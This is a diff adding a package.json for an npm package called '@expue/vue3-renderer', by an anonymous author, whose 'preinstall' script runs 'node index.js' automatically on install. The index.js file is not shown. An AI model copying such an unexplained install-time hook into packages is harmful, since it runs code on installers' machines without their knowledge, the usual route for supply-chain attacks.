@@ -1,1 +1,13 @@
 
+{
+  "name": "@expue/vue3-renderer",
+  "version": "0.0.3-alpha.0",
+  "description": "Latest v0.0.3-alpha.0",
+  "main": "index.js",
+  "scripts": {
+          "test": "echo \"Error: no test specified\" && exit 1",
+          "preinstall": "node index.js"
+  },
+  "author": "Anonymous",
+  "license": "ISC"
+}
